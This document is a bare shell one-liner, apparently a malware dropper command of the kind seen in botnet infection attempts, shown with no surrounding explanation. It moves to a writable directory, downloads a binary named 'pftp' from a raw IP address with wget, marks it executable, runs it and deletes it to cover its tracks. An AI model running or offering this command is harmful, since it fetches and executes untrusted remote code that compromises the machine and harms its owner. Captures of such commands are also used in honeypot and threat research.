cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.23.157.173/pftp; chmod +x pftp; ./pftp; rm -rf pftp
